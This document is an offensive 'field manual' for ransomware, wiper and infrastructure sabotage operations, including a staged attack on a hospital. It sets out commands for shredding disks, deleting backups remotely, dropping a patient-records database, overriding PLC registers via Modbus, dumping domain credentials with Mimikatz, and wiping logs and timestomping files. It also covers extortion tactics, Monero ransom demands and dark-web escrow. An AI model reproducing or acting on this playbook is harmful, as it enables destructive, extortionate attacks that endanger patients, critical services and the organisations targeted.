# Field manual: Operation Nutcracker (2025 Edition)

*When you want to leave more than just shells behind – leave chaos.*

## Operational objectives

* Sabotage – Render systems unusable for geopolitical or competitive advantage
* Extortion – Maximize payout pressure through multi-vector attacks
* Plausible Deniability – Burn the house down without leaving fingerprints

## Attack arsenal

1. AI-Optimized ransomware (LockBit 5.0 Protocol)

Adaptive encryption engine:

```python
# Pseudocode for ML-driven target selection
if file_extension in ('.sql','.vmx','.backup'):
    encrypt(file)  # Prioritizes DBs/VMs/backups
else:
    bypass(file)   # Skips non-critical files to accelerate encryption
```

Triple extortion playbook:

* Encrypt primary storage
* [exfiltrate](exfiltration.md) to private Tor-based leak site
* Threaten volumetric DDoS during negotiations

2. Hybrid Wiper-Ransomware (Blackout Worm variants)

Execution Flow:

```bash
# Phase 1: Backup Destruction (Linux)
shred -n 10 -u /dev/sdX  # DoD 7-pass equivalent

# Phase 2: Ransomware Deployment (Windows)
.\MedusaLocker.exe --extension .chernobyl --note README.html
```

Use `ionice -c 3` to reduce disk I/O visibility during shredding.

3. Critical Infrastructure Sabotage

SCADA/ICS killswitch:

```python
# Modbus TCP payload to override PLC registers
payload = b'\x00\x01\x00\x00\x00\x06\x01\x06\x00\x64\xFF\xFF'  # Force emergency shutdown
```

Database annihilation:

```sql
    DROP DATABASE patient_records WITH NORECOVERY;  # SQL Server persistent damage
```

4. Forensic countermeasures

Log Obliteration Kit:

```powershell
# Windows
Clear-EventLog -LogName Security,Application,System
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger -Name Start -Value 0

# Linux
find /var/log -type f -exec shred -n 3 {} \;
```

Timestomping:

```bash
touch -r /etc/passwd malicious_file  # Inherits timestamps from legitimate file
```

## Red team exercise: "Hospital Zero" (2025)

Phase 1: Infiltration

* Delivery: Malicious ISO masquerading as "Patient_Scan_2987.iso"
* Exploit: CLFS zero-day (CVE-2025-29824) → NT AUTHORITY\SYSTEM

Phase 2: Domain Dominance

```powershell
# Credential Harvesting
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:corp.hospital /user:Administrator"'

# Lateral Movement
Enter-PSSession -ComputerName DC01 -Credential $creds -Authentication Negotiate
```

Phase 3: Surgical Strikes

```bash
# Backup Neutralization
ssh backupadmin@veeam01 "sudo rm -rf /backups/archive/* --no-preserve-root"

# Ransomware Deployment
.\locker.exe --config config.json --timeout 900  # 15-minute encryption sprint
```

Phase 4: Extortion

Negotiation channels:

* Primary: Tox Protocol (qTox client)
* Fallback: ProtonMail dead-drop

Payment demand:

* 500 XMR (~$5M) for decryptor
* +200 XMR to suppress 42GB patient data leak

## Blue Team counter-tactics (For OpSec testing)

| Tactic	                | Red Team Evasion Method                         |
|------------------------|-------------------------------------------------|
| Air-gapped backups	    | Veeam credential theft → Remote backup deletion |
| EDR behavioral alerts	 | Process hollowing into `svchost.exe`            |
| Zero Trust policies	   | ADCS relay attacks to forge Kerberos tickets    |

## Lessons from the field

*"In 2025, the most effective attacks look like accidents until it's too late. Your ransomware should be the 
second-worst thing in the victim's timeline."*

## Operational checklist

- ✅ Test wiper modules in QEMU sandboxes before deployment
- ✅ Pre-negotiate XMR escrow channels with dark web brokers
- ✅ Embed false [flags](flag.md) 